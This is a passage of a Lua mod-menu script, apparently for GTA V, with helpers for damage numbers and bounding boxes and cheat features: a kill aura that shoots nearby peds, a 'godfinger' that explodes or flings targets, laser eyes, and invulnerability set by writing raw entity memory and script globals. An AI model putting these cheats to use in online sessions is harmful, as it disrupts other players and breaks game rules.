            bottom_left_back.x, bottom_left_back.y, bottom_left_back.z,
            bottom_right_back.x, bottom_right_back.y, bottom_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left_back.x, bottom_left_back.y, bottom_left_back.z,
            bottom_left.x, bottom_left.y, bottom_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left_back.x, bottom_left_back.y, bottom_left_back.z,
            top_left_back.x, top_left_back.y, top_left_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_left_back.x, top_left_back.y, top_left_back.z,
            top_right_back.x, top_right_back.y, top_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_left_back.x, top_left_back.y, top_left_back.z,
            top_left.x, top_left.y, top_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_right_back.x, bottom_right_back.y, bottom_right_back.z,
            top_right_back.x, top_right_back.y, top_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left.x, bottom_left.y, bottom_left.z,
            top_left.x, top_left.y, top_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left.x, bottom_left.y, bottom_left.z,
            bottom_right.x, bottom_right.y, bottom_right.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_right_back.x, bottom_right_back.y, bottom_right_back.z,
            bottom_right.x, bottom_right.y, bottom_right.z,
           colour.r, colour.g, colour.b, colour.a
        )
    end
    local numbers = {}
    local x_coord_ptr = memory.alloc(4)
    local y_coord_ptr = memory.alloc(4)
    local draw_numbers = function ()
        util.create_tick_handler(function() 
            local delta_time = MISC.GET_FRAME_TIME()
            for i, number in ipairs(numbers) do
                if GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(number.pos.x, number.pos.y, number.pos.z, x_coord_ptr, y_coord_ptr) then
                    local x = memory.read_float(x_coord_ptr)
                    local y = memory.read_float(y_coord_ptr)
                    local alpha = math.min(1, number.time)
                    directx.draw_text(x, y, number.num, ALIGN_CENTRE, number.size, {r = number.colour.r * alpha,g = number.colour.g * alpha,b = number.colour.b * alpha,a = number.colour.a * alpha}, false)
                    number.pos.z = number.pos.z + 0.2 * delta_time
                end
                number.time = number.time - delta_time
                if number.time < 0 then
                    table.remove(numbers, i)
                end
            end
            return #numbers ~= 0
        end)
    end
    local random_offset = 1
    self.draw_damage_number = function(entity, num, colour, size)
        pos = ENTITY.GET_ENTITY_COORDS(entity)
        random_offset_pos = {x = pos.x + (math.random() * random_offset - random_offset * 0.5),y = pos.y + (math.random() * random_offset - random_offset * 0.5),z = pos.z}
        numbers[#numbers+1] = {
            pos = random_offset_pos,
            colour = colour,
            num = num,
            size = size,
            time = 3
        }
        if #numbers == 1 then
            draw_numbers()
        end
    end
        --all credit to Nowiry#2663 for this one
        self.draw_button_tip = function (buttons, duration, colour)
            function equals(l1, l2)
                if l1 == l2 then return true end
                local type1 = type(l1)
                local type2 = type(l2)
                if type1 ~= type2 then return false end
                if type1 ~= 'table' then return false end
                for k, v in pairs(l1) do
                    if not l2[ k ] or not equals(v, l2[ k ]) then
                        return false
                    end
                end
                return true
            end
            local timer = 0
            util.create_tick_handler(function ()
                local INSTRUCTIONAL = {}
            INSTRUCTIONAL.scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('instructional_buttons')
            INSTRUCTIONAL.isKeyboard = PAD._IS_USING_KEYBOARD(2)
        
            if not equals(buttons, INSTRUCTIONAL.currentsettup) or INSTRUCTIONAL.isKeyboard ~= PAD._IS_USING_KEYBOARD(2) then
                local colour = colour or {
                    ['r'] = 0,
                    ['g'] = 0,
                    ['b'] = 0
                }
        
                while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(INSTRUCTIONAL.scaleform) do
                    util.yield()
                end
                
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'CLEAR_ALL')
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'TOGGLE_MOUSE_BUTTONS')
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                for i = 1, #buttons do
                    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'SET_DATA_SLOT')
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(i) --position
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(2, buttons[i][2], true)) --control
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(buttons[i][1]) --name
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(buttons[i][3] or false) --clickable
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(buttons[i][2]) --what control will be pressed when you click the button
                    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                end
        
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'SET_BACKGROUND_COLOUR')
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.r)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.g)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.b)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(80)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'DRAW_INSTRUCTIONAL_BUTTONS')
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                INSTRUCTIONAL.currentsettup = buttons
                INSTRUCTIONAL.isKeyboard = PAD._IS_USING_KEYBOARD(2)
            end
            GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(INSTRUCTIONAL.scaleform, 255, 255, 255, 255, 0)
            if timer > duration then
                return false
            end
            timer = timer + MISC.GET_FRAME_TIME()
            return true
            end)
        end
        return self
    end

b_colour = {}
b_colour.new = function ()
    local self = {}
    self.new = function (r, g, b, a)
        return {
            r = r,
            g = g,
            b = b,
            a = a
        }
    end
    self.white =    {r = 255,g = 255,b = 255,a = 255}

    self.black =    {r = 0,g = 0,b = 0,a = 255}

    self.magenta =  {r = 255,g = 0,b = 255,a = 255}

    self.red =      {r = 255,g = 0,b = 0,a = 255}

    self.green =    {r = 0,g = 255,b = 0,a = 255}

    self.blue =     {r = 0,g = 0,b = 255,a = 255}

    self.to_rage = function (colour)
        return {
            r = math.floor(colour.r * 255),
            g = math.floor(colour.g * 255),
            b = math.floor(colour.b * 255),
            a = math.floor(colour.a * 255)
        }
    end
    self.to_stand = function (colour)
        return {
            r = colour.r / 255,
            g = colour.g / 255,
            b = colour.b / 255,
            a = colour.a / 255
        }
    end
    return self
end

colour = b_colour.new()
drawing_funcs = b_drawing_funcs.new()
damage_numbers_target_ptr = memory.alloc(4)
damage_numbers_tracked_entities = {}
damage_numbers_health_colour = colour.to_stand(colour.new(20, 180, 50, 255))
damage_numbers_armour_colour = colour.to_stand(colour.new(50, 50, 200, 255))
damage_numbers_crit_colour = colour.to_stand(colour.new(200, 200, 10, 255))
damage_numbers_vehicle_colour = colour.to_stand(colour.new(200, 100, 20, 255))
damage_numbers_bone_ptr = memory.alloc(4)
damage_numbers_text_size = 0.700000
damage_numbers_target_vehicles = damage_numbers_text_size
function damage_numbers()
   if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), damage_numbers_target_ptr) then
        local target = memory.read_int(damage_numbers_target_ptr)
        if ENTITY.IS_ENTITY_A_PED(target) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(target, false)
            if vehicle ~= 0 and damage_numbers_target_vehicles then
                if damage_numbers_tracked_entities[vehicle] == nil then
                    damage_numbers_tracked_entities[vehicle] = {
                        health = math.max(0, ENTITY.GET_ENTITY_HEALTH(vehicle)),
                        timer = 1
                    }
                else
                    damage_numbers_tracked_entities[vehicle].timer = 1
                end
            end
                if damage_numbers_tracked_entities[target] == nil then
                    damage_numbers_tracked_entities[target] = {
                        health = math.max(0, ENTITY.GET_ENTITY_HEALTH(target) - 100),
                        armour = PED.GET_PED_ARMOUR(target),
                        timer = 1
                    }
                else
                    damage_numbers_tracked_entities[target].timer = 1
                end
        elseif ENTITY.IS_ENTITY_A_VEHICLE(target) and damage_numbers_target_vehicles then
            if damage_numbers_tracked_entities[target] == nil then
                damage_numbers_tracked_entities[target] = {
                    health = math.max(0, ENTITY.GET_ENTITY_HEALTH(target)),
                    timer = 1
                }
            else
                damage_numbers_tracked_entities[target].timer = 1
            end
        end
   end
   for entity, data in pairs(damage_numbers_tracked_entities) do
        if  ENTITY.IS_ENTITY_A_PED(entity) then
            local current_health = math.max(0, ENTITY.GET_ENTITY_HEALTH(entity) - 100)
            local current_armour = PED.GET_PED_ARMOUR(entity)
            if ENTITY.HAS_ENTITY_BEEN_DAMAGED_BY_ENTITY(entity, PLAYER.PLAYER_PED_ID(), 1) then
                if current_health < data.health then
                    data.timer = 1
                    PED.GET_PED_LAST_DAMAGE_BONE(entity, damage_numbers_bone_ptr)
                    if memory.read_int(damage_numbers_bone_ptr) == 31086 then
                        drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_crit_colour, damage_numbers_text_size)
                    else
                        drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_health_colour, damage_numbers_text_size)
                    end
                end
                if current_armour < data.armour then
                    data.timer = 1
                    drawing_funcs.draw_damage_number(entity, data.armour - current_armour, damage_numbers_armour_colour, damage_numbers_text_size)
                end
            end
            data.timer = data.timer - MISC.GET_FRAME_TIME()
            if data.timer < 0 then
                damage_numbers_tracked_entities[entity] = nil
            end
            data.health = current_health
            data.armour = current_armour
        else
            local current_health = math.max(0, ENTITY.GET_ENTITY_HEALTH(entity))
            if ENTITY.HAS_ENTITY_BEEN_DAMAGED_BY_ENTITY(entity, PLAYER.PLAYER_PED_ID(), 1) then
                if current_health < data.health then
                    data.timer = 1
                    drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_vehicle_colour, damage_numbers_text_size)
                end
            end
            data.timer = data.timer - MISC.GET_FRAME_TIME()
            if data.timer < 0 then
                damage_numbers_tracked_entities[entity] = nil
            end
            data.health = current_health
        end
    end
end
--恶灵骑士
function elqss()
vehicleelqs = CreateVehicle (1491277511,ENTITY.GET_ENTITY_COORDS(players.user_ped(),false),0,true)
ENTITY.SET_ENTITY_RENDER_SCORCHED(vehicleelqs,true)
VEHICLE.SET_VEHICLE_COLOURS(vehicleelqs,147,147)
VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicleelqs,30,15)
PED.SET_PED_INTO_VEHICLE(players.user_ped(),vehicleelqs,-1)
util.yield(500)
request_ptfx_asset(burning_man_ptfx_asset)
        for _, boneName in pairs({"wheel_lf", "wheel_lr"}) do
GRAPHICS.USE_PARTICLE_FX_ASSET(burning_man_ptfx_asset)
            local bone_id = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicleelqs, boneName)
            fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(burning_man_ptfx_effect, vehicleelqs, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, bone_id, 0.9, false, false, false, 0, 0, 0, 0)
            looped_ptfxs[#looped_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 100, 100, 100, false)
      end
end
--神指
local lastStop <const> = newTimer()
local draw_line = function (start, to, colour)
	GRAPHICS.DRAW_LINE(start.x, start.y, start.z, to.x, to.y, to.z, colour.r, colour.g, colour.b, colour.a)
end
local draw_rect = function (pos0, pos1, pos2, pos3, colour)
	GRAPHICS.DRAW_POLY(pos0.x, pos0.y, pos0.z, pos1.x, pos1.y, pos1.z, pos3.x, pos3.y, pos3.z, colour.r, colour.g, colour.b, colour.a)
	GRAPHICS.DRAW_POLY(pos3.x, pos3.y, pos3.z, pos2.x, pos2.y, pos2.z, pos0.x, pos0.y, pos0.z, colour.r, colour.g, colour.b, colour.a)
end
function get_raycast_result(dist, flag)
	local result = {}
	flag = flag or TraceFlag.everything
	local didHit = memory.alloc(1)
	local endCoords = v3.new()
	local normal = v3.new()
	local hitEntity = memory.alloc_int()
	local camPos = CAM.GET_FINAL_RENDERED_CAM_COORD()
	local offset = get_offset_from_cam(dist)

	local handle = SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
		camPos.x, camPos.y, camPos.z,
		offset.x, offset.y, offset.z,
		flag,
		players.user_ped(), 7
	)
	SHAPETEST.GET_SHAPE_TEST_RESULT(handle, didHit, endCoords, normal, hitEntity)

	result.didHit = memory.read_byte(didHit) ~= 0
	result.endCoords = endCoords
	result.surfaceNormal = normal
	result.hitEntity = memory.read_int(hitEntity)
	return result
end

function draw_bounding_box(entity, showPoly, colour)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return
	end
	colour = colour or {r = 255, g = 0, b = 0, a = 255}
	local min = v3.new()
	local max = v3.new()
	MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), min, max)
	min:abs(); max:abs()

	local upperLeftRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, -max.y, max.z)
	local upperRightRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, -max.y, max.z)
	local lowerLeftRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, -max.y, -min.z)
	local lowerRightRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, -max.y, -min.z)

	draw_line(upperLeftRear, upperRightRear, colour)
	draw_line(lowerLeftRear, lowerRightRear, colour)
	draw_line(upperLeftRear, lowerLeftRear, colour)
	draw_line(upperRightRear, lowerRightRear, colour)

	local upperLeftFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, min.y, max.z)
	local upperRightFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, min.y, max.z)
	local lowerLeftFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, min.y, -min.z)
	local lowerRightFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, min.y, -min.z)

	draw_line(upperLeftFront, upperRightFront, colour)
	draw_line(lowerLeftFront, lowerRightFront, colour)
	draw_line(upperLeftFront, lowerLeftFront, colour)
	draw_line(upperRightFront, lowerRightFront, colour)

	draw_line(upperLeftRear, upperLeftFront, colour)
	draw_line(upperRightRear, upperRightFront, colour)
	draw_line(lowerLeftRear, lowerLeftFront, colour)
	draw_line(lowerRightRear, lowerRightFront, colour)

	if type(showPoly) ~= "boolean" or showPoly then
		draw_rect(lowerLeftRear, upperLeftRear, lowerLeftFront, upperLeftFront, colour)
		draw_rect(upperRightRear, lowerRightRear, upperRightFront, lowerRightFront, colour)

		draw_rect(lowerLeftFront, upperLeftFront, lowerRightFront, upperRightFront, colour)
		draw_rect(upperLeftRear, lowerLeftRear, upperRightRear, lowerRightRear, colour)

		draw_rect(upperRightRear, upperRightFront, upperLeftRear, upperLeftFront, colour)
		draw_rect(lowerRightFront, lowerRightRear, lowerLeftFront, lowerLeftRear, colour)
	end
end
write_global = {
	byte = function(global, value)
		local address = memory.script_global(global)
		memory.write_byte(address, value)
	end,
	int = function(global, value)
		local address = memory.script_global(global)
		memory.write_int(address, value)
	end,
	float = function(global, value)
		local address = memory.script_global(global)
		memory.write_float(address, value)
	end
}
read_global = {
	byte = function(global)
		local address = memory.script_global(global)
		return memory.read_byte(address)
	end,
	int = function(global)
		local address = memory.script_global(global)
		return memory.read_int(address)
	end,
	float = function(global)
		local address = memory.script_global(global)
		return memory.read_float(address)
	end,
	string = function(global)
		local address = memory.script_global(global)
		return memory.read_string(address)
	end
}

local is_player_pointing = function ()
	return read_global.int(4521801 + 930) == 3
end
TraceFlag =
{
	everything = 4294967295,
	none = 0,
	world = 1,
	vehicles = 2,
	pedsSimpleCollision = 4,
	peds = 8,
	objects = 16,
	water = 32,
	foliage = 256,
}
function get_offset_from_cam(dist)
	local rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
	local pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
	local dir = rot:toDir()
	dir:mul(dist)
	local offset = v3.new(pos)
	offset:add(dir)
	return offset
end
function godfinger()
    if is_player_pointing() then
		write_global.int(4521801 + 935, NETWORK.GET_NETWORK_TIME())
		if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
			local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
			local raycastResult = get_raycast_result(500.0, flag)

			if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
				targetEntity = raycastResult.hitEntity
			end
		else
			local myPos = players.get_position(players.user())
			local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
			local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
			local distance = myPos:distance(entityPos)
			if distance > 30.0 then distance = 30.0
			elseif distance < 10.0 then distance = 10.0 end
			local targetPos = v3.new(camDir)
			targetPos:mul(distance)
			targetPos:add(myPos)
			local direction = v3.new(targetPos)
			direction:sub(entityPos)
			direction:normalise()

			if ENTITY.IS_ENTITY_A_PED(targetEntity) then
				direction:mul(5.0)
				local explosionPos = v3.new(entityPos)
				explosionPos:sub(direction)
				draw_bounding_box(targetEntity, false, {r = 255, g = 255, b = 255, a = 255})
				set_explosion_proof(players.user_ped(), true)
				explosionProof = true
				FIRE.ADD_EXPLOSION(explosionPos.x, explosionPos.y, explosionPos.z, 29, 25.0, false, true, 0.0, true)
			else
				local vel = v3.new(direction)
				local magnitude = entityPos:distance(targetPos)
				vel:mul(magnitude)
				draw_bounding_box(targetEntity, true, {r = 255, g = 255, b = 255, a = 80})
				request_control_once(targetEntity)
				ENTITY.SET_ENTITY_VELOCITY(targetEntity, vel.x, vel.y, vel.z)
			end
		end
	elseif targetEntity ~= NULL then
		lastStop.reset()
		targetEntity = NULL

	elseif explosionProof and lastStop.elapsed() > 500 then
		explosionProof = false
		set_explosion_proof(players.user_ped(), false)
    end
end
--光环
    peds_thread = util.create_thread(function (thr)

        while true do

            if PAD.IS_CONTROL_PRESSED(1, 86) then

            if ped_uses > 0 then

                ls_log("Ped pool is being updated")

                all_peds = entities.get_all_peds_as_handles()

                for k,ped in pairs(all_peds) do

                    if kill_aura then
								local myC = ENTITY.GET_ENTITY_COORDS(players.user_ped())
			
			GRAPHICS.DRAW_MARKER_SPHERE(myC.x, myC.y, myC.z, kill_aura_dist, 255, 0, 0, 0.3)
					
                            local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(v)

                            local hdl = pid_to_handle(pid)
														
		local weaponhash = 177293209

                                target = ENTITY.GET_ENTITY_COORDS(ped, false)

                                m_coords = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)

                                if MISC.GET_DISTANCE_BETWEEN_COORDS(m_coords.x, m_coords.y, m_coords.z, target.x, target.y, target.z, true) < kill_aura_dist and ENTITY.GET_ENTITY_HEALTH(ped) > 0 then
MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z']-2, target['x'], target['y'], target['z'], 1000.0, true, weaponhash, players.user_ped(), false, false, -1)
MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z']+0.1, 1000.0, true, weaponhash, players.user_ped(), false, false, -1)
MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z']-2, target['x'], target['y'], target['z'], 1000.0, true, weaponhash, players.user_ped(), false, false, -1)
MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z']+0.1, 1000.0, true, weaponhash, players.user_ped(), false, false, -1)
end

                            end

                        end

                    end

                end


        util.yield()

    end

end)

--声音
---@class Sound
Sound = {Id = -1, name = "", reference = ""}
Sound.__index = Sound

---@alias nullptr 0

---@param name string|nullptr
---@param reference string|nullptr
---@return Sound
function Sound.new(name, reference)
	local inst = setmetatable({}, Sound)
	inst.name = name
	inst.reference = reference
	return inst
end

function Sound:play()
	if self.Id == -1 then
        self.Id = AUDIO.GET_SOUND_ID()
        AUDIO.PLAY_SOUND_FRONTEND(self.Id, self.name, self.reference, true)
    end
end

function Sound:stop()
	if self.Id ~= -1 then
        AUDIO.STOP_SOUND(self.Id)
        AUDIO.RELEASE_SOUND_ID(self.Id)
        self.Id = -1
    end
end

function Sound:hasFinished()
	return AUDIO.HAS_SOUND_FINISHED(self.Id)
end

function Sound:playFromEntity(entity)
	if self.Id == -1 then
		self.Id = AUDIO.GET_SOUND_ID()
		AUDIO.PLAY_SOUND_FROM_ENTITY(self.Id, self.name, entity, self.reference, true, 0)
	end
end
--激光眼--
local function request_ptfx_asset_lasereyes(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
function laser_eyes()
    local weaponHash = util.joaat("weapon_heavysniper_mk2")
    local dictionary = "weap_xs_weapons"
    local ptfx_name = "bullet_tracer_xs_sr"
    local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    if PAD.IS_CONTROL_PRESSED(51, 51) then
        local inst = v3.new()
        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
        v3.add(inst, tmp)
        camAim_x, camAim_y, camAim_z = v3.get(inst)
        local ped_model = ENTITY.GET_ENTITY_MODEL(players.user_ped())
        local left_eye_id = 0
        local right_eye_id = 0
        pluto_switch ped_model do 
            case 1885233650:
            case -1667301416:
                left_eye_id = 25260
                right_eye_id = 27474
                break
            case 225514697:
            default:
                left_eye_id = 5956
                right_eye_id = 6468
        end
        local boneCoord_L = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), left_eye_id))
        local boneCoord_R = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), right_eye_id))
        if ped_model == util.joaat("mp_f_freemode_01") then 
            boneCoord_L.z += 0.02
            boneCoord_R.z += 0.02
        end
        camRot.x += 90
        request_ptfx_asset_lasereyes(dictionary)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
    end
end

--举手(按x)
function hhandup()
if PAD.IS_CONTROL_PRESSED(1, 323) then
                while not STREAMING.HAS_ANIM_DICT_LOADED("random@mugging3") do
                    STREAMING.REQUEST_ANIM_DICT("random@mugging3")
                    util.yield(100)
                end
                if not ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
                    WEAPON.SET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), MISC.GET_HASH_KEY("WEAPON_UNARMED"), true)
                    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3, 3, -1, 51, 0, false, false, false)
                    STREAMING.REMOVE_ANIM_DICT("random@mugging3")
                    PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
                end
            end
            if PAD.IS_CONTROL_RELEASED(1, 323) and ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
                TASK.CLEAR_PED_SECONDARY_TASK(PLAYER.PLAYER_PED_ID())
                PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
            end
end
--发光
Colour = {}
Colour.new = function(R, G, B, A)
    return {r = R or 0, g = G or 0, b = B or 0, a = A or 0}
end

function request_fx_asset(asset)
	STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
	while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
		util.yield()
	end
end
function FG()
		local localPed = PLAYER.PLAYER_PED_ID()
		local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
		local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
		local colour = Colour.new(5, 0, 0, 30)
		local colour2 = Colour.new(5, 50, 10, 30)
		request_fx_asset(effect.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			effect.name,
			localPed,
			0.0, 0.0, 0.75,
			0.0, 0.0, 0.0,
			0.09,
			false, false, false)
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			effect.name,
			localPed,
			0.0, 0.0, -2.9,
			0.0, 0.0, 0.0,
			1.0,
			false, false, false)
end
--核弹枪
function toDirection(rotation) 
	local adjusted_rotation = { 
		x = (math.pi / 180) * rotation.x, 
		y = (math.pi / 180) * rotation.y, 
		z = (math.pi / 180) * rotation.z 
	}
	local direction = {
		x = - math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		y =   math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		z =   math.sin(adjusted_rotation.x)
	}
	return direction
end
--一拳超人
function setBit(bitfield, bitNum)
	return (bitfield | (1 << bitNum))
end

function clearBit(bitfield, bitNum)
	return (bitfield & ~(1 << bitNum))
end
function set_explosion_proof(entity, value)
	local pEntity = entities.handle_to_pointer(entity)
	if pEntity == 0 then return end
	local damageBits = memory.read_uint(pEntity + 0x0188)
	damageBits = value and setBit(damageBits, 11) or clearBit(damageBits, 11)
	memory.write_uint(pEntity + 0x0188, damageBits)
end
function yqcr()
	local pWeapon = memory.alloc_int()
	WEAPON.GET_CURRENT_PED_WEAPON(players.user_ped(), pWeapon, 1)
	local weaponHash = memory.read_int(pWeapon)
	if WEAPON.IS_PED_ARMED(players.user_ped(), 1) or weaponHash == util.joaat("weapon_unarmed") then
		local pImpactCoords = v3.new()
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), pImpactCoords) then
			set_explosion_proof(players.user_ped(), true)
			util.yield_once()
			FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z - 1.0, 29, 5.0, false, true, 0.3, true)
		elseif not FIRE.IS_EXPLOSION_IN_SPHERE(29, pos.x, pos.y, pos.z, 2.0) then
			set_explosion_proof(players.user_ped(), false)
		end
	end
end
local agroup = "missfbi3ig_0"
local mshit = util.joaat("prop_big_shit_02")
local agroup2 = "switch@trevor@jerking_off"
local cum = util.joaat("p_oil_slick_01")
local anim2 = "trev_jerking_off_loop"
local anim = "shit_loop_trev"
local bigasscircle = util.joaat("ar_prop_ar_neon_gate4x_04a")
local ufo = util.joaat("sum_prop_dufocore_01a")
local num = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35"
}
local c1
local c2
local c3
local c4
